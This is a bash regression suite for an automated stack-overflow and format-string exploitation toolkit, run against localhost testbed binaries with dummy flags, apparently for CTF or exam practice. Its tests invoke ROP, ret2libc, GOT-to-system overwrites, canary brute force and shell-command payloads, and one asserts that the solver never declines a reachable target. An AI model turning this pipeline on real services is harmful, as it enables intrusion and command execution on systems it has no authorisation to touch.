#!/usr/bin/env bash
# Self-test for the BOF toolkit. Localhost only, dummy flags.
#   bash selftest.sh          # testbed regressions (fast, self-contained)
#   bash selftest.sh --full   # also run the held-out clones in ../sandbox if present
set -u
HERE="$(cd "$(dirname "$0")" && pwd)"; cd "$HERE"
PY=python3; FAILED=0; FULL=0; [ "${1:-}" = "--full" ] && FULL=1
# Per-section timing, so it is visible WHERE the suite spends its time rather than
# guessed at. A row that is slow because a tool is inefficient costs exam minutes too.
SECT_T=$(date +%s); SECT_NAME=""
say(){
  if [ -n "$SECT_NAME" ]; then
    printf '  \033[0;90m(%s took %ss)\033[0m\n' "$SECT_NAME" "$(( $(date +%s) - SECT_T ))"
  fi
  SECT_NAME="$*"; SECT_T=$(date +%s)
  printf '\n\033[1;34m== %s ==\033[0m\n' "$*"
}
ok(){  printf '  \033[1;32m[OK]\033[0m %s\n' "$*"; }
bad(){ printf '  \033[1;31m[FAIL]\033[0m %s\n' "$*"; FAILED=1; }
# Held-out sandbox binaries are served with testbed/server.py too (same wrapper, plus the
# wait-out-TIME_WAIT bind). ../sandbox/server.py is outside script/ and is left alone.
srv(){ "$PY" testbed/server.py "$HERE/testbed/$1" --port "$2" --cwd "$HERE/testbed" >/dev/null 2>&1 & echo $!; }
stop(){ kill "$1" 2>/dev/null; wait "$1" 2>/dev/null; }
# Belt and braces: a row whose server escapes `stop` leaves a process holding a socket,
# and thirty of those slow the later rows enough to make them look flaky.
reap(){ "$PY" - <<'PYREAP' 2>/dev/null
import os, signal, subprocess
pat = "test" + "bed/server.py"
alt = "sand" + "box/server.py"

# NEVER kill an ancestor. pgrep -f matches on the whole command line, so any wrapper
# script or shell whose text merely CONTAINS the pattern matches too - that is how this
# reap previously SIGKILLed the shell running the suite, truncating the run mid-section.
def ancestors(pid):
    seen = set()
    while pid and pid not in seen:
        seen.add(pid)
        try:
            with open(f"/proc/{pid}/stat") as fh:
                pid = int(fh.read().rsplit(")", 1)[1].split()[1])
        except (OSError, IndexError, ValueError):
            break
    return seen

safe = ancestors(os.getpid())
for p in (pat, alt):
    for pid in subprocess.run(["pgrep", "-f", p], capture_output=True, text=True).stdout.split():
        pid = int(pid)
        if pid in safe:
            continue
        # Only real server processes: the pattern must be an ARGUMENT, not buried in a
        # wrapper's script text.
        try:
            with open(f"/proc/{pid}/cmdline", "rb") as fh:
                argv = fh.read().split(b"\0")
        except OSError:
            continue
        if not any(a.decode("latin-1", "replace").endswith(p) for a in argv):
            continue
        try: os.kill(pid, signal.SIGKILL)
        except OSError: pass
PYREAP
}
# Wait until the port accepts rather than guessing with sleep. A fixed delay races
# under load and surfaces as a RANDOM row failing - worse than a real bug, because it
# trains you to re-run the suite instead of reading it. (Caught exactly that: the
# combo64 row failed once in a full run and passed standalone.)
# Up to 80s, not 8: server.py now waits out a port stuck in TIME_WAIT (see its comment),
# and this has to wait at least as long. A healthy start still returns in ~0.2s.
waitport(){ for _ in $(seq 1 800); do
    "$PY" -c "import socket,sys;s=socket.socket();s.settimeout(0.2);sys.exit(0 if s.connect_ex(('127.0.0.1',$1))==0 else 1)" 2>/dev/null && return 0
    sleep 0.1
  done; printf '  \033[1;31m[FAIL]\033[0m port %s never came up\n' "$1"; FAILED=1; return 1; }

say "build testbed"
(cd testbed && make all >/tmp/bof_tb.log 2>&1) && ok "make" || { cat /tmp/bof_tb.log; bad "make"; exit 1; }

# --- REGRESSION: live Echo32 shape. Chatty service that never echoes the payload.
# The leak used to include the service's own chatter, offsetting every address
# comparison by its length (live: true -0x10 reported as +0x2).
say "chatty non-echoing service: shift detection"
P=$(srv chatty_echo 18401); waitport 18401
OUT=$(timeout 120 "$PY" verify.py --binary ./testbed/chatty_echo-pad --host 127.0.0.1 --port 18401 2>&1)
echo "$OUT" | grep -q "exploit-shift -0x20" && ok "finds -0x20" || bad "wrong/no shift: $(echo "$OUT"|grep -oE 'exploit-shift [-+0x a-f0-9()]*'|head -1)"
echo "$OUT" | grep -q "CONFIRMED" && ok "shift CONFIRMED by direct read" || bad "shift not confirmed"
timeout 120 "$PY" ret2shell.py --binary ./testbed/chatty_echo-pad --host 127.0.0.1 --port 18401 --shift=-0x20 \
  --cmd 'echo ===SHELL===; cat flags/chatty.txt' 2>/dev/null | tr -d '\0' \
  | grep -q "SIT{chatty_echo_shift}" && ok "exploit lands -> flag" || bad "exploit failed"
stop "$P"

say "NEGATIVE: same build must NOT report a shift"
P=$(srv chatty_echo 18402); waitport 18402
timeout 120 "$PY" verify.py --binary ./testbed/chatty_echo --host 127.0.0.1 --port 18402 2>&1 \
  | grep -q "remote binary == local binary" && ok "same build detected" || bad "same build misreported"
stop "$P"

# --- REGRESSION: live 5001 shape. Guard constant exists ONLY in the source.
say "source-only var: guard constant from chall.c"
P=$(srv varsrc 18403); waitport 18403
timeout 90 "$PY" auto_pwn.py --host 127.0.0.1 --port 18403 --source testbed/src/varsrc.c --goal var 2>/dev/null \
  | grep -q "SIT{var_from_source}" && ok "var solved with no --value" || bad "source-only var"
stop "$P"

say "NEGATIVE: var with no guard anywhere must fail LOUDLY, not write 0"
P=$(srv varsrc 18404); waitport 18404
O=$(timeout 60 "$PY" auto_pwn.py --host 127.0.0.1 --port 18404 --goal var 2>&1)
echo "$O" | grep -q "no guard constant found" && ok "refuses instead of writing 0" || bad "silently wrote 0"
stop "$P"

say "ROP: win(arg) needs a chain, not a single address"
P=$(srv winarg64 18601); waitport 18601
timeout 90 "$PY" auto_pwn.py --host 127.0.0.1 --port 18601 --binary testbed/winarg64 --goal ret2win \
  --offset 56 --win-arg 0xC0DE 2>/dev/null | grep -q "SIT{r0p_w1th_arg}" \
  && ok "--win-arg builds pop rdi chain" || bad "--win-arg"
stop "$P"
P=$(srv winarg64 18602); waitport 18602
timeout 150 "$PY" auto_pwn.py --host 127.0.0.1 --port 18602 --binary testbed/winarg64 --goal ret2win \
  --offset 56 2>/dev/null | grep -q "SIT{r0p_w1th_arg}" \
  && ok "win-arg found automatically (no flags)" || bad "automatic win-arg escalation"
stop "$P"

say "ROP: 64-bit stack alignment handled automatically"
P=$(srv align64 18603); waitport 18603
timeout 150 "$PY" auto_pwn.py --host 127.0.0.1 --port 18603 --binary testbed/align64 --goal ret2win \
  --offset 56 2>/dev/null | grep -q "SIT{st4ck_4l1gned}" \
  && ok "realigning ret retried automatically" || bad "alignment retry"
stop "$P"

say "menus: blind send fails, --talk succeeds"
P=$(srv menu32 18604); waitport 18604
timeout 60 "$PY" auto_pwn.py --host 127.0.0.1 --port 18604 --binary testbed/menu32 --goal ret2win \
  --offset 52 --max-attempts 3 2>/dev/null | grep -q "SIT{m3nu_n4v1g4t3d}" \
  && bad "blind send should NOT reach a menu-gated bug" || ok "blind send correctly fails"
stop "$P"
P=$(srv menu32 18605); waitport 18605
timeout 90 "$PY" auto_pwn.py --host 127.0.0.1 --port 18605 --binary testbed/menu32 --goal ret2win \
  --talk 'Choice:=2' --talk 'Name:=PAYLOAD' 2>/dev/null | grep -q "SIT{m3nu_n4v1g4t3d}" \
  && ok "--talk walks the menu -> flag" || bad "--talk"
stop "$P"
P=$(srv menu32 18606); waitport 18606
timeout 90 "$PY" solve.py 127.0.0.1 18606 --binary testbed/menu32 2>/dev/null \
  | grep -q "SUGGESTED CONVERSATION" && ok "menu refusal suggests a --talk chain" || bad "no --talk suggestion"
stop "$P"

say "rate-limited service: scanning fails, --cyclic wins in one connection"
P=$(srv cyclic32 18701); waitport 18701
# This used to assert that a short scan CANNOT beat a rate-limited target. That premise
# died when elftool's frame-derived offsets were wired in: the scan now starts at the
# real offset, so it succeeds on attempt 1. Assert the improvement instead.
timeout 90 "$PY" auto_pwn.py --host 127.0.0.1 --port 18701 --binary testbed/cyclic32 --goal ret2win \
  --max-attempts 2 2>/dev/null | grep -q "SIT{cycl1c_0ffs3t}" \
  && ok "binary-informed scan hits the offset within 2 attempts" \
  || bad "frame-derived offsets not being used"
stop "$P"
P=$(srv cyclic32 18702); waitport 18702
timeout 120 "$PY" auto_pwn.py --host 127.0.0.1 --port 18702 --binary testbed/cyclic32 --goal ret2win \
  --cyclic 2>/dev/null | grep -q "SIT{cycl1c_0ffs3t}" \
  && ok "--cyclic finds the offset in one shot -> flag" || bad "--cyclic"
stop "$P"

say "format-string EXACT write (two %hn halves)"
P=$(srv fmtwrite32 18703); waitport 18703
timeout 200 "$PY" fmtwrite.py 127.0.0.1 18703 --addr-regex 'lives at (0x[0-9a-f]+)' --value 0xDEADBEEF 2>/dev/null \
  | grep -q "SIT{ex4ct_hn_wr1t3}" && ok "fmtwrite.py writes 0xDEADBEEF exactly" || bad "fmtwrite.py"
stop "$P"
"$PY" -c "
import sys; sys.path.insert(0,'.')
from fmtwrite import build
p,(f,s,p1,p2)=build(0x804c034,0xDEADBEEF,39)
assert (f,s,p1,p2)==(0xBEEF,0xDEAD,48871,8126), (f,s,p1,p2)
assert b'%48871c%39\$hn' in p and b'%8126c%40\$hn' in p
" 2>/dev/null && ok "cumulative pad arithmetic is correct" || bad "pad arithmetic"

say "GOT overwrite -> system(), full chain"
P=$(srv got32 19101); waitport 19101
GOT=$("$PY" elftool.py testbed/got32 2>/dev/null | awk '/^  puts /{print $NF}' | sed 's/got=//')
timeout 240 "$PY" fmtwrite.py 127.0.0.1 19101 --addr "$GOT" \
  --value-regex 'system\(\) is at (0x[0-9a-f]+)' --pre 'cat flags/got.txt' 2>/dev/null \
  | grep -q "SIT{g0t_0v3rwr1t3_sh3ll}" && ok "puts@GOT -> system -> flag" || bad "GOT overwrite chain"
stop "$P"

say "solve.py covers every taught shape"
"$PY" solve.py --help >/dev/null 2>&1 && ok "solve.py runs" || bad "solve.py broken"
P=$(srv cyclic32 19102); waitport 19102
"$PY" solve.py 127.0.0.1 19102 --binary testbed/cyclic32 2>/dev/null | grep -q "cyclic" \
  && ok "ranks a cyclic fallback" || bad "no cyclic candidate"
stop "$P"
P=$(srv got32 19103); waitport 19103
O=$(timeout 120 "$PY" solve.py 127.0.0.1 19103 --binary testbed/got32 2>&1)
echo "$O" | grep -q "fmt-write" && ok "ranks fmt-write" || bad "no fmt-write candidate"
echo "$O" | grep -q "TARGETED FORMAT-STRING WRITE" && ok "hands over fmtwrite.py + GOT addr" \
  || printf '  \033[1;33m[note]\033[0m targeted-write hint not shown (fmt probe negative here)\n'
stop "$P"

say "PIE: load base recovered from a leak, per connection (ASLR)"
P=$(srv pie32 19601); waitport 19601
timeout 200 "$PY" solve.py 127.0.0.1 19601 --binary testbed/pie32 --run 2>/dev/null \
  | grep -q "SIT{p13_r3b4s3d}" && ok "PIE rebased -> flag" || bad "PIE"
stop "$P"

say "stack canary: leaked, written back, overflow continues"
P=$(srv canary32 19602); waitport 19602
timeout 200 "$PY" auto_pwn.py --host 127.0.0.1 --port 19602 --binary testbed/canary32 \
  --goal ret2win --offset 80 2>/dev/null | grep -q "SIT{c4n4ry_pr3s3rv3d}" \
  && ok "canary preserved -> flag" || bad "canary"
stop "$P"
P=$(srv canary32 19603); waitport 19603
timeout 120 "$PY" auto_pwn.py --host 127.0.0.1 --port 19603 --binary testbed/canary32 \
  --goal ret2win --offset 80 --no-canary --max-attempts 3 2>/dev/null \
  | grep -q "SIT{c4n4ry_pr3s3rv3d}" && bad "should NOT win while smashing the canary" \
  || ok "NEGATIVE: smashing the canary correctly fails"
stop "$P"

say "blind service: nothing leaked at all, offset from survival alone"
P=$(srv blind32 19901); waitport 19901
timeout 120 "$PY" auto_pwn.py --host 127.0.0.1 --port 19901 --binary testbed/blind32 \
  --goal ret2win --cyclic 2>/dev/null | grep -q "SIT{bl1nd_cr4sh_0r4cl3}" \
  && ok "cyclic fell through to the crash oracle -> flag" || bad "blind cyclic fallback"
stop "$P"
P=$(srv blind32 19902); waitport 19902
timeout 280 "$PY" solve.py 127.0.0.1 19902 --binary testbed/blind32 --run 2>/dev/null \
  | grep -q "SIT{bl1nd_cr4sh_0r4cl3}" && ok "solve.py alone solves a blind target" || bad "blind via solve.py"
stop "$P"

say "GOT->system with no value chosen by hand"
P=$(srv got32 19903); waitport 19903
timeout 280 "$PY" solve.py 127.0.0.1 19903 --binary testbed/got32 --run 2>/dev/null \
  | grep -q "SOLVED via fmt-write GOT->system" \
  && ok "solve.py routes and runs the GOT->system chain" || bad "auto GOT->system"
stop "$P"

say "PIE with NO leak: 2-byte partial overwrite (probabilistic)"
P=$(srv pieblind32 20201); waitport 20201
timeout 300 "$PY" auto_pwn.py --host 127.0.0.1 --port 20201 --binary testbed/pieblind32 \
  --partial --offset 76 --send-mode raw 2>/dev/null | grep -q "SIT{p4rt14l_0v3rwr1t3}" \
  && ok "partial overwrite beats PIE with no leak" || bad "PIE partial overwrite"
stop "$P"

say "canary with NO leak: byte-by-byte brute against a forking service"
( cd testbed && ./canaryfork32 20202 >/dev/null 2>&1 & ) ; waitport 20202
CFPID=$(pgrep -f "canaryfork32 20202" | head -1)
timeout 420 "$PY" auto_pwn.py --host 127.0.0.1 --port 20202 --binary testbed/canaryfork32 \
  --goal ret2win --offset 80 --brute-canary --send-mode raw --idle 0.05 --timeout 1.0 \
  --max-attempts 400 2>/dev/null | grep -q "SIT{c4n4ry_brut3d}" \
  && ok "canary recovered with no leak -> flag" || bad "canary brute force"
[ -n "${CFPID:-}" ] && kill "$CFPID" 2>/dev/null   # kill by PID: pkill -f matches this script too

say "always ATTEMPT: menu solved with no manual --talk"
P=$(srv menu32 20401); waitport 20401
timeout 280 "$PY" solve.py 127.0.0.1 20401 --binary testbed/menu32 --run 2>/dev/null \
  | grep -q "SIT{m3nu_n4v1g4t3d}" && ok "solve.py walks the menu itself -> flag" || bad "menu auto-walk"
stop "$P"

say "always ATTEMPT: a dead end is tried, not declined"
# h6 used to be the dead end here. ret2libc solves it now, so this needs a target that
# genuinely cannot be solved: a service with no binary and no recognisable protocol.
"$PY" - <<'PYDEAD' >/dev/null 2>&1 &
import socket, threading
def h(c):
    try:
        c.sendall(b"NOPE/1.0\n"); c.recv(4096); c.sendall(b"?\n")
    except OSError: pass
    finally:
        try: c.close()
        except OSError: pass
s = socket.socket(); s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(("127.0.0.1", 20402)); s.listen(16)
while True:
    c, _ = s.accept(); threading.Thread(target=h, args=(c,), daemon=True).start()
PYDEAD
P=$!
waitport 20402
O=$(timeout 150 "$PY" solve.py 127.0.0.1 20402 --run --timeout 45 2>&1)
RC=$?
stop "$P"
echo "$O" | grep -q "attempted [0-9]* technique" && ok "exhausted the battery instead of refusing" || bad "did not attempt"
[ "$RC" = 2 ] && ok "exit 2 (tried and failed), not 3 (declined)" || bad "wrong exit code: $RC"
echo "$O" | grep -q "Ctrl-C to stop early" && ok "announces its time budget" || bad "no budget warning"

say "triage without --run still diagnoses instantly"
P=$(srv menu32 20403); waitport 20403
S=$(date +%s)
timeout 60 "$PY" solve.py 127.0.0.1 20403 --binary testbed/menu32 >/dev/null 2>&1
E=$(( $(date +%s) - S ))
stop "$P"
[ "$E" -le 5 ] && ok "triage returns in ${E}s" || bad "triage too slow: ${E}s"

say "FULL RELRO: GOT is read-only, so hit a writable .data pointer instead"
P=$(srv relro32 20601); waitport 20601
timeout 280 "$PY" fmtwrite.py 127.0.0.1 20601 --addr-regex 'handler pointer at (0x[0-9a-f]+)' \
  --value-regex 'win\(\) at (0x[0-9a-f]+)' --half low 2>/dev/null \
  | grep -q "SIT{full_r3lr0_d4t4_ptr}" && ok "full RELRO bypassed via .data pointer" || bad "full RELRO"
stop "$P"
P=$(srv relro32 20602); waitport 20602
timeout 120 "$PY" fmtwrite.py 127.0.0.1 20602 --addr-regex 'handler pointer at (0x[0-9a-f]+)' \
  --value-regex 'win\(\) at (0x[0-9a-f]+)' 2>&1 \
  | grep -q "truncate on" && ok "warns that addr+2 holds a bad byte (0x0a)" || bad "no bad-byte warning"
stop "$P"

say "UNSEEN SHAPE: four hostile features at once, composed with no new code"
# 64-bit + menu-gated bug + leaked canary + win(key). No single other clone mixes these.
# This is the test for COMPOSITION rather than pattern-matching a known clone.
P=$(srv combo64 20931); waitport 20931
timeout 300 "$PY" auto_pwn.py --host 127.0.0.1 --port 20931 --binary testbed/combo64 \
  --goal ret2win --offset 88 --talk 'Choice:=3' --talk 'Name:=PAYLOAD' 2>/dev/null \
  | grep -q "SIT{c0mp0s3d_unse3n_sh4p3}" \
  && ok "menu + canary + win-arg + 64-bit composed -> flag" || bad "composition on unseen shape"
stop "$P"

say "INVARIANT: --run never declines on a reachable target"
# The goal is a tool that ATTEMPTS anything. Exit 3 means "declined"; under --run that
# must only ever happen when the target is unreachable. Everything else - full RELRO,
# a re-rolling canary, NX with no win, blind PIE, menus, a silent service, a protocol
# we have never seen - must be ATTEMPTED and come back 0 (solved) or 2 (tried, failed).
"$PY" - <<'PYSILENT' >/dev/null 2>&1 &
import socket, threading
s = socket.socket(); s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(("127.0.0.1", 20701)); s.listen(16)
while True:
    c, _ = s.accept(); threading.Timer(3.0, c.close).start()   # connects, says nothing
PYSILENT
SILENT=$!
"$PY" - <<'PYNOISE' >/dev/null 2>&1 &
import socket, threading
def h(c):
    try:
        c.sendall(b"GARBLED/1.0 \x01\x02 ready\n")
        c.recv(4096); c.sendall(b"?\n")
    except OSError: pass
    finally:
        try: c.close()
        except OSError: pass
s = socket.socket(); s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(("127.0.0.1", 20702)); s.listen(16)
while True:
    c, _ = s.accept(); threading.Thread(target=h, args=(c,), daemon=True).start()
PYNOISE
NOISE=$!
waitport 20701; waitport 20702

inv(){ LBL="$1"; PORT="$2"; shift 2
  timeout 120 "$PY" solve.py 127.0.0.1 "$PORT" "$@" --run --timeout 20 >/dev/null 2>&1
  RC=$?
  if [ "$RC" = 3 ]; then bad "DECLINED (exit 3) on $LBL - must attempt"
  else ok "attempted $LBL (exit $RC)"; fi; }

P=$(srv relro32 20711); waitport 20711; inv "full RELRO"        20711 --binary testbed/relro32;     stop "$P"
P=$(srv pieblind32 20712); waitport 20712; inv "blind PIE"         20712 --binary testbed/pieblind32;  stop "$P"
P=$(srv menu32 20713); waitport 20713; inv "menu-driven"       20713 --binary testbed/menu32;      stop "$P"
P=$("$PY" testbed/server.py "$HERE/../sandbox/h6_shell32nx" --port 20714 --cwd "$HERE/../sandbox" >/dev/null 2>&1 & echo $!)
waitport 20714; inv "NX, no win, no fmt" 20714 --binary ../sandbox/h6_shell32nx; stop "$P"
( cd testbed && ./canaryfork32 20715 >/dev/null 2>&1 & ); waitport 20715
CF2=$(pgrep -f "canaryfork32 20715" | head -1)
inv "forking canary" 20715 --binary testbed/canaryfork32
[ -n "${CF2:-}" ] && kill "$CF2" 2>/dev/null
inv "silent service, no files"   20701
inv "unknown protocol, no files" 20702
for v in "${SILENT:-}" "${NOISE:-}"; do [ -n "$v" ] && kill "$v" 2>/dev/null; done; true

say "ret2libc: NX on, no win(), no format bug"
P=$(srv ret2libc32 21401); waitport 21401
timeout 200 "$PY" ret2libc.py 127.0.0.1 21401 --binary testbed/ret2libc32 \
  --cmd 'echo ===SHELL===; cat flags/libc.txt' 2>/dev/null \
  | grep -q "SIT{r3t2l1bc_ch41n}" && ok "leak puts -> libc base -> system(/bin/sh)" || bad "ret2libc"
stop "$P"
reap
P=$("$PY" testbed/server.py "$HERE/../sandbox/h6_shell32nx" --port 21402 --cwd "$HERE/../sandbox" >/dev/null 2>&1 & echo $!)
waitport 21402
timeout 400 "$PY" solve.py 127.0.0.1 21402 --binary ../sandbox/h6_shell32nx --run --timeout 300 2>/dev/null \
  | grep -q "FLAG{h3ld_0ut_6_nx_never_reached}" \
  && ok "solve.py routes the old NX dead end to ret2libc -> flag" || bad "h6 via ret2libc"
stop "$P"

say "ret2libc: libc assumption is cross-checked, not assumed"
P=$(srv ret2libc32 21911); waitport 21911
# Assert the OUTCOME, not the route. The two-leak cross-check is a best-effort
# diagnostic with a deliberate fallback to the single-leak chain, so demanding
# "cross-check OK" every time asserts something only probabilistically true - which is
# exactly how a test starts failing at random and stops being believed.
O=$(timeout 250 "$PY" ret2libc.py 127.0.0.1 21911 --binary testbed/ret2libc32 \
  --cmd 'echo ===SHELL===; cat flags/libc.txt' 2>/dev/null)
echo "$O" | grep -q "SIT{r3t2l1bc_ch41n}" && ok "ret2libc solves (cross-check or fallback)" \
  || bad "ret2libc 32-bit"
echo "$O" | grep -qE "cross-check OK|retrying" && ok "libc verification path engaged" \
  || bad "cross-check never attempted"
stop "$P"
P=$(srv ret2libc32 21912); waitport 21912
timeout 120 "$PY" ret2libc.py 127.0.0.1 21912 --binary testbed/ret2libc32 \
  --libc /lib/x86_64-linux-gnu/libc.so.6 2>&1 | grep -qE "MISMATCH|non-page-aligned" \
  && ok "NEGATIVE: wrong libc is caught, not used silently" || bad "wrong libc not detected"
stop "$P"

say "ret2libc 64-bit: pop rdi chain + movaps realignment"
P=$(srv libc64 21901); waitport 21901
timeout 250 "$PY" ret2libc.py 127.0.0.1 21901 --binary testbed/libc64 \
  --cmd 'echo ===SHELL===; cat flags/libc64.txt' 2>/dev/null \
  | grep -q "SIT{r3t2l1bc_64b1t}" && ok "64-bit ret2libc -> flag" || bad "64-bit ret2libc"
stop "$P"

say "battery completeness: every tool is reachable without ranking"
"$PY" - <<'PYAUDIT' && ok "battery covers every exploit tool" || bad "a tool is unreachable from the battery"
import sys, types
sys.path.insert(0, ".")
import solve

# Ask battery() for the real commands rather than grepping its source: it builds the
# auto_pwn invocations from a prefix passed in, so the filename never appears literally.
a = types.SimpleNamespace(host="127.0.0.1", port=1, binary="testbed/chatty_echo",
                          source=None, flag_regex=None)
elf = {"bits": 32, "pie": False, "nx": True, "canary": True,
       "plt": {"puts": 0x1}, "gadgets": {}}
cmds = [" ".join(c["cmd"]) for c in solve.battery(a, elf, [], solve.ap_of(a))]
need = ["auto_pwn.py", "ret2shell.py", "ret2libc.py"]
missing = [t for t in need if not any(t in c for c in cmds)]
if missing:
    print("missing from battery:", missing)
    for c in cmds: print("   ", c[:100])
    sys.exit(1)
sys.exit(0)
PYAUDIT

say "strcmp from the BINARY (no source): literals out of .rodata"
P=$("$PY" testbed/server.py "$HERE/../sandbox/simple_strcmp32" --port 24201 --cwd "$HERE/../sandbox" >/dev/null 2>&1 & echo $!)
waitport 24201
timeout 200 "$PY" auto_pwn.py --host 127.0.0.1 --port 24201 --binary ../sandbox/simple_strcmp32 \
  --goal strcmp 2>/dev/null | grep -q "FLAG{dummy_bof_local}" \
  && ok "strcmp literal recovered from .rodata" || bad "strcmp from binary"
stop "$P"
reap
P=$("$PY" testbed/server.py "$HERE/../sandbox/simple_strcmp32" --port 24202 --cwd "$HERE/../sandbox" >/dev/null 2>&1 & echo $!)
waitport 24202
timeout 400 "$PY" solve.py 127.0.0.1 24202 --binary ../sandbox/simple_strcmp32 --run --timeout 300 2>/dev/null \
  | grep -q "FLAG{dummy_bof_local}" && ok "solve.py solves the adjacent-strcmp shape (frame guard or strcmp route)" || bad "strcmp routing"
stop "$P"

say "fmt-write to a leaked address (guard only needs to CHANGE)"
reap
P=$("$PY" testbed/server.py "$HERE/../sandbox/genie32" --port 24801 --cwd "$HERE/../sandbox" >/dev/null 2>&1 & echo $!)
waitport 24801
timeout 200 "$PY" fmtwrite.py 127.0.0.1 24801 --addr-regex 'stored at (0x[0-9a-f]+)' \
  --value any 2>/dev/null | grep -q "FLAG{dummy_bof_local}" \
  && ok "bare %n fits a 15-byte buffer and flips the guard" || bad "genie %n write"
stop "$P"
P=$("$PY" testbed/server.py "$HERE/../sandbox/genie32" --port 24802 --cwd "$HERE/../sandbox" >/dev/null 2>&1 & echo $!)
waitport 24802
timeout 200 "$PY" solve.py 127.0.0.1 24802 --binary ../sandbox/genie32 2>/dev/null \
  | grep -q "fmt-write to a leaked address" \
  && ok "solve.py spots fmt-bug + leaked writable address" || bad "genie routing"
stop "$P"

say "beginner traps: swapped files and a dead host"
"$PY" solve.py 127.0.0.1 9 --binary testbed/src/var64.c 2>&1 \
  | grep -q "Use:  --source" && ok "a .c given as --binary names the right flag" \
  || bad "swapped --binary not caught"
"$PY" solve.py 127.0.0.1 9 --source testbed/winarg64 2>&1 \
  | grep -q "use:  --binary" && ok "an ELF given as --source names the right flag" \
  || bad "swapped --source not caught"
timeout 40 "$PY" solve.py 10.255.255.1 9999 2>&1 \
  | grep -q "nc 10.255.255.1 9999" && ok "a dead host gets a checklist, not a shrug" \
  || bad "no advice for a dead host"

say "win(char *key): the argument is a POINTER to a .rodata literal"
P=$(srv strarg64 27701); waitport 27701
timeout 220 "$PY" solve.py 127.0.0.1 27701 --binary testbed/strarg64 --run --timeout 170 2>/dev/null \
  | grep -q "SIT{p0int3r_4rg_r0p}" && ok "literal address passed as the win argument" \
  || bad "string-pointer argument"
stop "$P"
# The compared literal must come FIRST, or the right chain is tried last.
"$PY" - <<'PYPA' && ok "compared literal ranks first" || bad "literal ordering"
import sys
sys.path.insert(0, ".")
from auto_pwn import extract_win_ptr_args
got = extract_win_ptr_args("testbed/strarg64")
assert got and got[0] == 0x402008, [hex(v) for v in got]
PYPA

say "64-bit guard loaded with mov, not cmp-imm"
P=$(srv var64 27401); waitport 27401
timeout 200 "$PY" solve.py 127.0.0.1 27401 --binary testbed/var64 --run --timeout 150 2>/dev/null \
  | grep -q "SIT{v4r64_m0v_cmp}" && ok "mov-loaded 64-bit guard is recovered and written" \
  || bad "64-bit var guard"
stop "$P"
# NEGATIVE: the extractor must not hand back an ADDRESS as if it were a guard value.
"$PY" - <<'PYMG' && ok "an address is never mistaken for a guard value" || bad "address leaked into magic"
import sys
sys.path.insert(0, ".")
from auto_pwn import extract_magic
from elftool import ELF
got = extract_magic("testbed/var64")
assert 0xFEEDFACE in got, got
ranges = [(s["addr"], s["addr"] + max(s.get("size") or 0, 1))
          for s in ELF("testbed/var64").sections if s.get("addr")]
for v in got:
    assert not any(lo <= v < hi for lo, hi in ranges), f"{v:#x} is an address"
PYMG

say "win(a, b): two-argument ROP, both constants derived from the binary"
P=$(srv twoarg64 27001); waitport 27001
timeout 200 "$PY" solve.py 127.0.0.1 27001 --binary testbed/twoarg64 --run --timeout 150 2>/dev/null \
  | grep -q "SIT{tw0_4rg_r0p}" && ok "two-pop chain built with no hand-typed values" \
  || bad "two-argument ret2win"
stop "$P"
# 64-bit guards compile to mov+cmp, not cmp-imm: prove the values come out in ARG ORDER.
"$PY" - <<'PYWA' && ok "win() constants recovered in argument order" || bad "win-arg extraction"
import sys
sys.path.insert(0, ".")
from auto_pwn import extract_win_args
got = extract_win_args("testbed/twoarg64")[:2]
assert got == [0xDEADBEEF, 0xCAFEBABE], got
PYWA

say "full RELRO .data function pointer, routed with no hand-held address"
P=$(srv relro32 26301); waitport 26301
timeout 280 "$PY" solve.py 127.0.0.1 26301 --binary testbed/relro32 --run --timeout 200 2>/dev/null \
  | grep -q "SIT{full_r3lr0_d4t4_ptr}" \
  && ok "solve.py routes the .data pointer overwrite" || bad "relro routing"
stop "$P"

say "input-function awareness: badchars derived from the sink"
P=$(srv scanf32 25201); waitport 25201
O=$(timeout 150 "$PY" auto_pwn.py --host 127.0.0.1 --port 25201 --binary testbed/scanf32 \
     --goal ret2win --offset 76 --max-attempts 4 2>&1)
stop "$P"
echo "$O" | grep -q "SIT{sc4nf_wh1t3sp4c3}" && ok "scanf target solved" || bad "scanf target"
echo "$O" | grep -q "0x20 would truncate" && ok "whitespace identified from the scanf sink" \
  || bad "sink badchars not derived"
# An address the sink cannot carry must be reported, not silently retried forever.
P=$(srv scanf32 25202); waitport 25202
timeout 90 "$PY" auto_pwn.py --host 127.0.0.1 --port 25202 --binary testbed/scanf32 \
  --goal ret2win --offset 76 --addr 0x08200000 --max-attempts 2 2>&1 \
  | grep -q "SKIPPED" && ok "undeliverable address is explained, not silently failed" \
  || bad "no explanation for an undeliverable address"
stop "$P"

say "fmt-write with the target taken from the BINARY, not a leak"
P=$(srv fmtwrite32 34301); waitport 34301
timeout 280 "$PY" solve.py 127.0.0.1 34301 --binary testbed/fmtwrite32 --run --timeout 220 2>/dev/null \
  | grep -q "SIT{ex4ct_hn_wr1t3}" \
  && ok "exact magic written to a leaked address" || bad "fmtwrite32 via solve.py"
stop "$P"
P=$(srv menufmt32 34302); waitport 34302
timeout 280 "$PY" solve.py 127.0.0.1 34302 --binary testbed/menufmt32 --run --timeout 220 2>/dev/null \
  | grep -q "SIT{fmt_b3h1nd_4_m3nu}" \
  && ok "fmt bug behind a menu: global from the symbol table, walked with --pre" \
  || bad "menufmt32 via solve.py"
stop "$P"
# The writable-global list must stay precise; a noisy list would burn the budget.
"$PY" - <<'PYSYM' && ok "writable globals extracted precisely" || bad "data_symbols noisy"
import sys
sys.path.insert(0, ".")
from elftool import ELF
for b, want in (("testbed/menufmt32", "target"), ("testbed/fmtwrite32", "target"),
                ("testbed/relro32", "handler")):
    d = ELF(b).report().get("data_symbols") or {}
    assert want in d, (b, d)
    assert len(d) <= 4, (b, d)
PYSYM

say "COMPOSITION: a menu in front of a per-connection canary"
P=$(srv menucanary32 34201); waitport 34201
timeout 280 "$PY" solve.py 127.0.0.1 34201 --binary testbed/menucanary32 --run --timeout 220 2>/dev/null \
  > /tmp/mc_route.log 2>&1
grep -q "SIT{m3nu_pluS_c4n4ry}" /tmp/mc_route.log \
  && ok "canary revealed mid-menu is read and spliced" || bad "menu+canary composition"
# It must win on the RANKED path, not only through the exhaustive battery: the fallback
# took 24s where the ranked candidate takes 9s, and on a bigger buffer it would not fit.
grep -q "SOLVED via ret2win (canary leaked) via menu option" /tmp/mc_route.log \
